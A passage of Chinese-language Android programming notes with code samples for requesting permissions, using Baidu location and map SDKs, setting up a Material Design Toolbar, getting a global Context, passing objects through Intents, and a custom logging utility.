permissionList.add(Manifest.permission.READ_PHONE_STATE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">            permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果权限数组不为空，则证明有权限未申请</span></span><br><span class="line">        <span class="keyword">if</span> (!permissionList.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 将该申请的权限转换为String[]数组</span></span><br><span class="line">            String [] permissions = permissionList.toArray(<span class="keyword">new</span> String[permissionList.</span><br><span class="line">                size()]);</span><br><span class="line">            <span class="comment">// 进行权限的申请</span></span><br><span class="line">            ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, permissions, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            requestLocation();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mLocationClient.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> result : grantResults) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (result != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">                            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;必须同意所有权限才能使用本程序&quot;</span>,</span><br><span class="line">                                Toast.LENGTH_SHORT).show();</span><br><span class="line">                            <span class="comment">// 如果有权限未被同意，则退出程序</span></span><br><span class="line">                            finish();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//同意所有权限后，加载位置</span></span><br><span class="line">                    requestLocation();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;发生未知错误&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    finish();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得相应参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocationListener</span> <span class="keyword">implements</span> <span class="title">BDLocationListener</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceiveLocation</span><span class="params">(BDLocation location)</span> </span>&#123;</span><br><span class="line">            runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    StringBuilder currentPosition = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;纬度：&quot;</span>).append(location.getLatitude()).</span><br><span class="line"></span><br><span class="line">                        append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;经线：&quot;</span>).append(location.getLongitude()).</span><br><span class="line">                        append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;定位方式：&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (location.getLocType() == BDLocation.TypeGpsLocation) &#123;</span><br><span class="line">                        currentPosition.append(<span class="string">&quot;GPS&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (location.getLocType() ==</span><br><span class="line">                        BDLocation.TypeNetWorkLocation) &#123;</span><br><span class="line">                        currentPosition.append(<span class="string">&quot;网络&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    positionText.setText(currentPosition);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onConnectHotSpotMessage</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="实时更新位置">实时更新位置<a class="header-anchor" href="#实时更新位置"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        initLocation();</span><br><span class="line">        mLocationClient.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">        LocationClientOption option = <span class="keyword">new</span> LocationClientOption();</span><br><span class="line">        option.setScanSpan(<span class="number">5000</span>);</span><br><span class="line">        mLocationClient.setLocOption(option);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line"></span><br><span class="line">        mLocationClient.stop();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="选择定位模式">选择定位模式<a class="header-anchor" href="#选择定位模式"> ¶ </a></h4>
<p>上述方式为网络定位</p>
<p>切换到GPS定位。手机设置：位置信息模式→高精确度</p>
<blockquote>
<p>定位模式进行指定，一共有3种模式可选：Hight_Accuracy、Battery_Saving和Device_Sensors。</p>
<p>Hight_Accuracy表示高精确度模式，会在GPS信号正常的情况下优先使用GPS定位，在无法接收GPS信号的时候使用网络定位。</p>
<p>Battery_Saving表示节电模式，只会使用网络进行定位。</p>
<p>Device_Sensors表示传感器模式，只会使用GPS进行定位。</p>
<p>其中，Hight_Accuracy是默认的模式。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">        LocationClientOption option = <span class="keyword">new</span> LocationClientOption();</span><br><span class="line">        option.setScanSpan(<span class="number">5000</span>);</span><br><span class="line">        <span class="comment">// 设置定位模式</span></span><br><span class="line">        option.setLocationMode(LocationClientOption.LocationMode.Device_Sensors);</span><br><span class="line">        mLocationClient.setLocOption(option);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="显示位置相关信息">显示位置相关信息<a class="header-anchor" href="#显示位置相关信息"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置LocationClientOption的 需要获取当前位置详细的地址信息</span></span><br><span class="line">option.setIsNeedAddress(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">StringBuilder currentPosition = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">currentPosition.append(<span class="string">&quot;纬度：&quot;</span>).append(location.getLatitude()).</span><br><span class="line">append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">currentPosition.append(<span class="string">&quot;经线：&quot;</span>).append(location.getLongitude()).</span><br><span class="line">append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">currentPosition.append(<span class="string">&quot;国家：&quot;</span>).append(location.getCountry()).</span><br><span class="line">append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">currentPosition.append(<span class="string">&quot;省：&quot;</span>).append(location.getProvince()).</span><br><span class="line">append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">currentPosition.append(<span class="string">&quot;市：&quot;</span>).append(location.getCity()).</span><br><span class="line">append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">currentPosition.append(<span class="string">&quot;区：&quot;</span>).append(location.getDistrict()).</span><br><span class="line">append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">currentPosition.append(<span class="string">&quot;街道：&quot;</span>).append(location.getStreet()).</span><br><span class="line">append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">currentPosition.append(<span class="string">&quot;定位方式：&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (location.getLocType() == BDLocation.TypeGpsLocation) &#123;</span><br><span class="line">currentPosition.append(<span class="string">&quot;GPS&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (location.getLocType() ==</span><br><span class="line">BDLocation.TypeNetWorkLocation) &#123;</span><br><span class="line">currentPosition.append(<span class="string">&quot;网络&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">positionText.setText(currentPosition);</span><br></pre></td></tr></table></figure>
<h3 id="使用百度地图">使用百度地图<a class="header-anchor" href="#使用百度地图"> ¶ </a></h3>
<p>添加地图控件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.baidu.mapapi.map.MapView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/bmapView&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:clickable</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>添加Application继承类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        <span class="comment">//初始化百度地图</span></span><br><span class="line">        SDKInitializer.initialize(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 同时使AndroidManifest中&lt;application&gt;节点的 name属性为该类</span></span><br></pre></td></tr></table></figure>
<p>java代码实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> MapView mapView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">// 初始化要在 setContentView 前</span></span><br><span class="line">        mLocationClient = <span class="keyword">new</span> LocationClient(getApplicationContext());</span><br><span class="line">        mLocationClient.registerLocationListener(<span class="keyword">new</span> MyLocationListener());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 添加下面这个，就不用添加自定义Application类了</span></span><br><span class="line">        SDKInitializer.initialize(getApplication());</span><br><span class="line">        </span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        mapView = (MapView) findViewById(R.id.bmapView);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 重写相应方法，及时释放资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        mapView.onResume();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        mapView.onPause();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line"></span><br><span class="line">        mLocationClient.stop();</span><br><span class="line">        mapView.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="定位到当前位置">定位到当前位置<a class="header-anchor" href="#定位到当前位置"> ¶ </a></h4>
<p>先获得地图总控制器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BaiduMap baiduMap = mapView.getMap();</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>设置缩放级别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置缩放级别(3~21)，值越大地图越精细</span></span><br><span class="line">MapStatusUpdate update = MapStatusUpdateFactory.zoomTo(<span class="number">12.5f</span>);</span><br><span class="line"><span class="comment">// 最后需要调用该方法 使update的设置生效</span></span><br><span class="line">baiduMap.animateMapStatus(update);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>设置经纬度</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LatLng ll = <span class="keyword">new</span> LatLng(<span class="number">39.915</span>, <span class="number">116.404</span>);</span><br><span class="line">MapStatusUpdate update = MapStatusUpdateFactory.newLatLng(ll);</span><br><span class="line">baiduMap.animateMapStatus(update);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="显示所在位置光标">显示所在位置光标<a class="header-anchor" href="#显示所在位置光标"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> BaiduMap baiduMap;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isFirstLocate = <span class="keyword">true</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">// 初始化要在 setContentView 前</span></span><br><span class="line">        mLocationClient = <span class="keyword">new</span> LocationClient(getApplicationContext());</span><br><span class="line">        mLocationClient.registerLocationListener(<span class="keyword">new</span> MyLocationListener());</span><br><span class="line">        </span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        mapView = (MapView) findViewById(R.id.bmapView);</span><br><span class="line">        <span class="comment">// 获得Map控制器</span></span><br><span class="line">        baiduMap = mapView.getMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启用我的位置显示</span></span><br><span class="line">        baiduMap.setMyLocationEnabled(<span class="keyword">true</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">navigateTo</span><span class="params">(BDLocation location)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 地图定位到当前位置</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 判断是不是第一次定位</span></span><br><span class="line">        <span class="comment">// 定位到当前位置，同时设置精度</span></span><br><span class="line">        <span class="keyword">if</span> (isFirstLocate) &#123;</span><br><span class="line">            LatLng ll = <span class="keyword">new</span> LatLng(location.getLatitude(), location.getLongitude());</span><br><span class="line">            MapStatusUpdate update = MapStatusUpdateFactory.newLatLng(ll);</span><br><span class="line">            baiduMap.animateMapStatus(update);</span><br><span class="line">            update = MapStatusUpdateFactory.zoomTo(<span class="number">16f</span>);</span><br><span class="line">            baiduMap.animateMapStatus(update);</span><br><span class="line">            isFirstLocate = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 地图上当前位置 显示我的图标</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 封装设备当前所在位置</span></span><br><span class="line">        MyLocationData.Builder locationBuilder = <span class="keyword">new</span> MyLocationData.Builder();</span><br><span class="line">        locationBuilder.latitude(location.getLatitude());</span><br><span class="line">        locationBuilder.longitude(location.getLongitude());</span><br><span class="line">        MyLocationData locationData = locationBuilder.build();</span><br><span class="line">        <span class="comment">// 设置上“我的位置”</span></span><br><span class="line">        baiduMap.setMyLocationData(locationData);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocationListener</span> <span class="keyword">implements</span> <span class="title">BDLocationListener</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceiveLocation</span><span class="params">(BDLocation location)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (location.getLocType() == BDLocation.TypeGpsLocation</span><br><span class="line">                || location.getLocType() == BDLocation.TypeNetWorkLocation) &#123;</span><br><span class="line">                <span class="comment">// 初始化地图</span></span><br><span class="line">                navigateTo(location);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        mLocationClient.stop();</span><br><span class="line">        mapView.onDestroy();</span><br><span class="line">        <span class="comment">// 关闭我的位置显示，节约资源</span></span><br><span class="line">        baiduMap.setMyLocationEnabled(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最佳的UI体验——MaterialDesign实战">最佳的UI体验——MaterialDesign实战<a class="header-anchor" href="#最佳的UI体验——MaterialDesign实战"> ¶ </a></h2>
<h3 id="Toolbar">Toolbar<a class="header-anchor" href="#Toolbar"> ¶ </a></h3>
<p>项目主题由AndroidManifest中的android:theme指定，默认继承的<code>Theme.AppCompat.Light.DarkActionBar</code>含有ActionBar</p>
<p>指定一个不带ActionBar的主题：<code>Theme.AppCompat.NoActionBar</code>(深色主题) 和<code>Theme.AppCompat.Light.NoActionBar</code>(浅色主题)这两种主题可选</p>
<p>而AppTheme的style中指定的item有以下几种</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//ThemeStyleColor.jpg" alt="ThemeStyleColor"></p>
<p>使用TooBar</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FrameLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">android.support.v7.widget.Toolbar</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/toolbar&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;?attr/actionBarSize&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">&quot;?attr/colorPrimary&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:popupTheme</span>=<span class="string">&quot;@style/ThemeOverlay.AppCompat.Light&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用xmlns:app 指定了一个新的命名空间。由于Material Design是在Android 5.0系统中才出现的，而很多的Material属性在5.0之前的系统中并不存在，那么为了能够兼容之前的老系统，我们就不能使用android:attribute 这样的写法了，而是应该使用app:attribute 。</p>
<h2 id="继续进阶—应该掌握的高级技巧">继续进阶—应该掌握的高级技巧<a class="header-anchor" href="#继续进阶—应该掌握的高级技巧"> ¶ </a></h2>
<h3 id="全局获取Context技巧">全局获取Context技巧<a class="header-anchor" href="#全局获取Context技巧"> ¶ </a></h3>
<p>定义一个MyApp类，继承Application</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Context context;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        context = getApplicationContext();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Context <span class="title">getContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> context;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>指定name属性<code>&lt;application         android:name=&quot;MyApplication&quot;         ...&gt;</code></p>
<h3 id="使用Intent传递对象">使用Intent传递对象<a class="header-anchor" href="#使用Intent传递对象"> ¶ </a></h3>
<h4 id="Serializable方式">Serializable方式<a class="header-anchor" href="#Serializable方式"> ¶ </a></h4>
<p>直接让实体类实现Serializable接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br></pre></td></tr></table></figure>
<p>传递时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person person = <span class="keyword">new</span> Person();</span><br><span class="line">person.setName(<span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">person.setAge(<span class="number">20</span>);</span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;person_data&quot;</span>, person);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>接收时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person person = (Person) getIntent().getSerializableExtra(<span class="string">&quot;person_data&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="Parcelable方式">Parcelable方式<a class="header-anchor" href="#Parcelable方式"> ¶ </a></h4>
<p>实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Parcelable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// describeContents() 方法直接返回0就可以了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">        dest.writeString(name);  <span class="comment">// 写出name</span></span><br><span class="line">        dest.writeInt(age);  <span class="comment">// 写出age</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 而writeToParcel() 方法中我们需要调用Parcel的writeXxx() 方法，将Person 类中的字段一一写出。注意，字符串型数据就调用writeString()方法，整型数据就调用writeInt() 方法，以此类推。</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;Person&gt; CREATOR = <span class="keyword">new</span> Parcelable.</span><br><span class="line">        Creator&lt;Person&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Person <span class="title">createFromParcel</span><span class="params">(Parcel source)</span> </span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.name = source.readString();  <span class="comment">// 读取name</span></span><br><span class="line">            person.age = source.readInt();  <span class="comment">// 读取age</span></span><br><span class="line">            <span class="keyword">return</span> person;</span><br><span class="line">            <span class="comment">// 读取存入，并返回对象</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Person[] newArray(<span class="keyword">int</span> size) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Person[size];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传递方法相同</p>
<p>读取时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person person = (Person) getIntent().getParcelableExtra(<span class="string">&quot;person_data&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="自己的日志打印工具">自己的日志打印工具<a class="header-anchor" href="#自己的日志打印工具"> ¶ </a></h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VERBOSE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEBUG = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INFO = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WARN = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ERROR = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NOTHING = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> level = VERBOSE;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">v</span><span class="params">(String tag, String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (level &lt;= VERBOSE) &#123;</span><br><span class="line">            Log.v(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">d</span><span class="params">(String tag, String msg)</span> 